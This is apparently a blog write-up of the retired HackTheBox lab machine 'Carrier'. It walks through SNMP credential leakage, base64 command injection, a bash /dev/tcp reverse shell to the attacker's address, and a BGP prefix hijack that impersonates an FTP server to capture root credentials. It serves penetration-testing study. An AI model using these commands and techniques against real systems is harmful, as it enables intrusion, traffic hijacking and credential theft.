@@ -1,0 +1,537 @@
+
+
+#### Background
+
+
+**Carrier** is a retired vulnerable VM from HackTheBox. This box is really fun since it allows us to play with  BGP Hijacking which is pretty rare to see in CTF like challenges.
+
+#### Enumeration
+
+To begin the enumeration process, a **TCP/UDP** port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 
+
+###### OS Information
+Based on the Apache version, it looks like we are dealing with Xenial / Ubuntu 16.04 based system.
+
+###### Open Ports:
+In addition to usual ports, 22 and 80 UDP port 161 is open. UDP 161 is the standard SNMP port.There is also a filtered ftp port showing.
+```python
+
+PORT   STATE    SERVICE REASON         VERSION
+21/tcp filtered ftp     no-response
+22/tcp open     ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| 
+80/tcp open     http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Login
+```
+
+###### Webserver - Port 80
+
+![source-01](/img/Screenshot_2020-05-27_16-31-11.png){: .align-left}
+
+Browsing to the site we see a login page with weird error messeges **(Error 45007 and Error 45009)**, but we don't have credentials to login. So lets start directory enumeration.
+
+```python
+➜  carrier wfuzz --hc=404 -z file,/usr/share/wordlists/dirb/common.txt http://10.10.10.105/FUZZ
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.105/FUZZ
+Total requests: 4614
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                              
+===================================================================
+
+000000001:   200        63 L     105 W    1509 Ch     ""                                                                                                   
+000000011:   403        11 L     32 W     291 Ch      ".hta"                                                                                               
+000000012:   403        11 L     32 W     296 Ch      ".htaccess"                                                                                          
+000000013:   403        11 L     32 W     296 Ch      ".htpasswd"                                                                                          
+000001114:   301        9 L      28 W     310 Ch      "css"                                                                                                
+000001196:   301        9 L      28 W     312 Ch      "debug"                                                                                              
+000001313:   301        9 L      28 W     310 Ch      "doc"                                                                                                
+000001648:   301        9 L      28 W     312 Ch      "fonts"                                                                                              
+000001998:   301        9 L      28 W     310 Ch      "img"                                                                                                
+000002021:   200        63 L     105 W    1509 Ch     "index.php"                                                                                          
+000002179:   301        9 L      28 W     309 Ch      "js"                                                                                                 
+000003588:   403        11 L     32 W     300 Ch      "server-status"                                                                                      
+000004087:   301        9 L      28 W     312 Ch      "tools"                                                                                              
+
+
+```
+
+The directory enumeration reveals an interesting directory **/doc** which contains a network diagram and a usermanual.
+
+The Network diagram showing 3 different **BGP** autonomous systems.
+
+>BGP is the protocol that makes the Internet work. It does this by enabling data routing on the Internet.BGP is responsible for looking at all of the available paths that data could travel and picking the best route, which usually means hopping between autonomous systems. 
+
+![source-01](/img/diagram_for_tac.png){: .align-left}
+
++ Lyghtspeed networks AS 100 is connected to two other networks, AS 200 and AS 300.
+
+###### CW1000-X Manual 
+
+![source-01](/img/Screenshot_2020-05-27_16-49-23.png){: .align-left}
+
+The “error_codes.pdf” contains explanations for different error codes, the weird error codes we saw earlier on webpage. One of those are 45009, which states that the admin still uses default credentials which are set to a “chassis serial number”
+
++ 45007 License invalid or expired
++ 45009 System credentials have not been set
++ Default admin user password is set (see chassis serial number)
+
+After further enumeration, i coudnt find the chassis serial number, so decided to move on and check SNMP service.
+
+###### SNMP Enumeration:
+```python
+
+➜  carrier snmpwalk -c public 10.10.10.105 -v 1
+Created directory: /var/lib/snmp/mib_indexes
+iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
+End of MIB
+```
+
+Yes this look like the serial number we are looking for. Lets try to log in with credentials **(admin:NET_45JDX23)**
+
+![source-01](/img/Screenshot_2020-05-27_17-08-58.png){: .align-left}
+
+**Tickets**
+
+After going through the webpage.The ticket number 6 give us some information about VIP is having issues connecting to FTP to an important server in the 10.120.15.0/24 network, investigating... This might be important to us later !
+
+![source-01](/img/Screenshot_2020-05-27_17-17-26.png){: .align-left}
+
+**Checking diag page**
+
+![source-01](/img/Screenshot_2020-05-27_17-23-45.png){: .align-left}
+
+It look like the server might be running “ps” command.
+
+> Quagga is a routing software suite, providing implementations of OSPFv2, OSPFv3, RIP v1 and v2, RIPng and BGP-4 for Unix platforms, particularly FreeBSD, Linux, Solaris and NetBSD. Quagga is a fork of GNU Zebra which was developed by Kunihiro Ishiguro.
+
+#### Exploitation
+
+Lets explore the web app behavior in the burp suite. 
+
+![source-01](/img/Screenshot_2020-05-27_17-38-09.png){: .align-left}
+
+We can see check{} sending  some base64 encoded string.Lets decode it and see what it is.
+
+![source-01](/img/Screenshot_2020-05-27_17-39-13.png){: .align-left}
+
+Decoding the base64 reveals it is sending the word quagga, and the web application is showing all the process that contains the string **“quagga”**. So that means the web application is maybe running “ps” with “grep quagga” command. Lets explore this futher and see if we can inject our own command to it and send. 
+
+By changing the parameter to “id” and then encoding it with base64 and forward the request to the server.
+
+![source-01](/img/Screenshot_2020-05-27_17-41-07.png){: .align-left}
+
+And it works, we have command injection and it shows as root !!. It is even possible to get user.txt file before getting a reverseShell.
+
+#### Exploitation:
+
+Lets get a reverse shell back to our attacker machine for further exploitation.I am going to send a simple base64 enc0ded bash reverse shell.
+> ; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.x/9999 0>&1"
+
+![source-01](/img/Screenshot_2020-05-27_18-36-08.png){: .align-left}
+
+Send the command inside the POST request via the check parameter. After executing it got a reverse Shell as root, but root flag is not here.
+
+```python
+
+➜  carrier nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.10.10.105] 51560
+bash: cannot set terminal process group (2323): Inappropriate ioctl for device
+bash: no job control in this shell
+root@r1:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@r1:~# ls
+ls
+test_intercept.pcap
+user.txt
+root@r1:~# cat user.txt
+```
+
+
+#### Network Enumeration:
+So we are basically inside a router, by typing hostname it says we are in R1. Again back to enumeration, we need to gather all the information we need to escalate our priviledges to root. So i ran LinePeas.sh which is a post exploitation information gathering tool.
+
+The router has three network interfaces:
++ eth0: 10.99.64.2/24
++ eth1: 10.78.10.1/24
++ eth2: 10.78.11.1/24
+
+The arp table shows IP addresses from all of the networks listed above.
+
+```python
+
+root@r1:~# arp
+arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
+10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
+10.99.64.251             ether   00:16:3e:f3:92:14   C                     eth0
+10.99.64.1               ether   fe:3c:27:ea:df:39   C                     eth0
+root@r1:~# 
+```
+###### 10.120.15.0/24  Network Scan:
+
+From the ticket we know the important FTP server in 10.120.15.0/24 subnet. Lets quickly grab the live IP;s from the subnet.
+```python
+root@r1:~# for i in {1..255}; do ping -c 1 10.120.15.$i | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 ; done
+<$i | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 ; done             
+10.120.15.1
+10.120.15.10
+
+```
+Here we got two IP's one is the gateway and another one is the real FTP Server IP. Lets confirm this.
+```python
+
+root@r1:~# telnet 10.120.15.10 21
+telnet 10.120.15.10 21
+Trying 10.120.15.10...
+Connected to 10.120.15.10.
+Escape character is '^]'.
+220 (vsFTPd 3.0.3)
+```
+Great, 10.120.15.10 is the FTP server we are looking for.
+
+###### Interesting job in Crontab:
+```python
+
+root@r1:~#     crontab -l
+    crontab -l
+# Edit this file to introduce tasks to be run by cron.
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/10 * * * * /opt/restore.sh
+root@r1:~# 
+```
+A script in /opt/ directory called “restore.sh”
+```python
+
+root@r1:/opt# cat restore.sh
+cat restore.sh
+#!/bin/sh
+systemctl stop quagga
+killall vtysh
+cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
+cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
+systemctl start quagga
+```
+This script restores the BGP configuration every 10 minutes and overwrite changes to the Quagga configuration. So basical if we want bring any changes to the BGP configuration for our attack we just need to change the permission of this restore.sh file, so it wont run every 10 min and overwrite our changes. 
+
+Searching for quagga, we can see all configuration related it from /etc/quagga
+```python
+
+root@r1:~# cd /etc/quagga
+cd /etc/quagga
+root@r1:/etc/quagga# ls
+ls
+bgpd.conf
+bgpd.conf.orig
+bgpd.conf.sav
+daemons
+debian.conf
+zebra.conf
+zebra.conf.orig
+zebra.conf.sav
+root@r1:/etc/quagga# 
+```
++ BGPD maintains BGP neighbor relations and settings
++ Zebra maintains routing information
++ debian.conf give us an importnt piece of information which has the line -vtysh_enable=yes. This mean the system has vtysh enabled. vtysh is a integrated shell for Quagga routing engine We will use this to get into BGP configuration.
+
+###### BGP Configuration:
+The bgpd.conf file contains the BGP configuration of the r1 router.
+```python
+
+root@r1:~# cat /etc/quagga/bgpd.conf
+cat /etc/quagga/bgpd.conf
+!
+! Zebra configuration saved from vty
+!   2018/07/02 02:14:27
+!
+route-map to-as200 permit 10
+route-map to-as300 permit 10
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+line vty
+!
+```
+
+###### BGP routing table:
+```python
+
+root@r1:~# vtysh
+vtysh
+
+Hello, this is Quagga (version 0.99.24.1).
+Copyright 1996-2005 Kunihiro Ishiguro, et al.
+
+r1# show ip bgp
+show ip bgp
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
+*> 10.78.11.0/24    0.0.0.0                  0         32768 ?
+*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
+*  10.100.10.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.11.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.12.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.13.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.14.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.15.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.16.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.17.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.18.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.19.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.20.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*> 10.101.8.0/21    0.0.0.0                  0         32768 i
+*> 10.101.16.0/21   0.0.0.0                  0         32768 i
+*> 10.120.10.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.11.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.12.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.13.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.14.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.15.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.16.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.17.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.18.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.19.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+*> 10.120.20.0/24   10.78.11.2               0             0 300 i
+*                   10.78.10.2                             0 200 300 i
+
+Total number of prefixes 27
+
+```
+Important information we need to note from the routing table to perform our attack.
+
++ AS300 is advertising the 10.120.15.0/24 prefix.
++ Traffic to 10.120.15.10 are routed through 10.78.11.2
++ R1 is peering with two BGP neighbors, AS200 and AS300.
+
+
+#### BGP Hijacking - Priviledge Escalation
+
+From our network  recon we have got the following information:
+
++ There is a VIP FTP server in the 10.120.15.0/24 network.
++ AS300 was advertising the 10.120.15.0/24 prefix
++ We have full control of BGP router.
++ IP Address of FTP Server 10.120.15.10
++ We need to intercept traffic comming from 10.120.15.10 to perform our attack.
+
+
+##### Prefix Hijacking Attacks
+
+BGP always favors the shortest, most specific path to the desired IP address. In order for the BGP hijack to be successful, the route announcement must either Offer a more specific route by announcing a smaller range of IP addresses than other ASes had previously announced or Offer a shorter route to certain blocks of IP addresses.
+
+###### Attack Plan
+
++ We need to advertise a route to the other(AS) stating that AS100 know how to reach the 10.120.15.0/24
++ As AS300 is advertising routes for 10.120.15.0/24 network, so we will advertise a more specific route that supersedes AS300 route and add our route to the neighour routers routing tables. This way traffic should be routed to AS100.
++ We will advertise a route with a larger prefix, we’ll advertise 10.120.15.0/25.
+
+Lets change the configuration of R1. Add network 10.120.15.0/25
+
+```python
+
+r1# conf t
+  conf t
+  r1(config)# ip route 10.120.15.0/25 10.78.11.2
+  ip route 10.120.15.0/25 10.78.11.2
+  r1(config)# router bgp 100
+  router bgp 100
+  r1(config-router)# network 10.120.15.0/25
+  network 10.120.15.0/25
+  r1(config-router)# end
+  end
+  r1# show ip bgp
+  ```
+  If we check BGP routes we can confirm our 10.120.15.0/25 network is successfully added.
+  
+```python
+  
+  r1# show ip bgp
+show ip bgp
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
+*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
+*  10.100.10.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.11.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.12.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.13.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.14.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.15.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.16.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.17.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.18.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.19.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.20.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*> 10.101.8.0/21    0.0.0.0                  0         32768 i
+*> 10.101.16.0/21   0.0.0.0                  0         32768 i
+*  10.120.10.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.11.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.12.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.13.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.14.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*> 10.120.15.0/24   0.0.0.0                  0         32768 ?
+*                   10.78.10.2                             0 200 300 i
+*                   10.78.11.2               0             0 300 i
+*> 10.120.15.0/25   0.0.0.0                  0         32768 i
+*  10.120.16.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.17.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.18.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.19.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.20.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+
+Total number of prefixes 27
+```
+The prefix is successfully updated.
+
+**Impersonating FTP Server**
+
+To Impersonate the FTP server we add the following command to R1. Adding route traffic destined for 10.120.15.10 to the eth2:1 interface.
+
+ifconfig eth2:1 10.120.15.10 netmask 255.255.255.0 up 2>&1
+
+###### Listening FTP traffic
+Once we receive a connection to FTP server press Enter and when root USER popups enter 331 FTP response code for Enter password. We have successfully hijacked BGP  to steal FTP credentials. 
+
+```python
+
+root@r1:~# nc -lvp 21
+nc -lvp 21
+Listening on [0.0.0.0] (family 0, port 21)
+Connection from [10.78.10.2] port 21 [tcp/ftp] accepted (family 2, sport 44650)
+
+USER root
+331
+PASS BGPtelc0rout1ng
+```
+Awsome Now, we can revert the network configurations and log in to carrier with the root credentials to root.txt
+
+
+```python
+
+  carrier ssh root@10.10.10.105
+The authenticity of host '10.10.10.105 (10.10.10.105)' can't be established.
+ECDSA key fingerprint is SHA256:ocbg7qpaEpjQc5WGCnavYd2bgyXg7S8if8UaXgT1ztE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.105' (ECDSA) to the list of known hosts.
+root@10.10.10.105's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri May 29 09:21:33 UTC 2020
+
+  System load:  0.0                Users logged in:       0
+  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
+  Memory usage: 30%                IP address for lxdbr0: 10.99.64.1
+  Swap usage:   0%                 IP address for lxdbr1: 10.120.15.10
+  Processes:    203
+
+
+
+Last login: Wed Sep  5 14:32:15 2018
+root@carrier:~# ls
+root.txt  secretdata.txt
+root@carrier:~# 
+```
+Game over.
+
+###### Beyond Root
+
+Notice secretdata.txt, i digged about this a bit and found out it is related to the LXD containers
+for the machine.
+
+ LXC is installed in this host. lxc list command shows there are multiple containers running, R1,R2,R3 in the host.
+ 
+> LXC (Linux Containers) is an operating-system-level virtualization method for running multiple isolated Linux systems (containers) on a control host using a single Linux kernel.
+
+
+###### Conclusion:
+
+This was a great box which expose me to BGP Hijacking. 
+
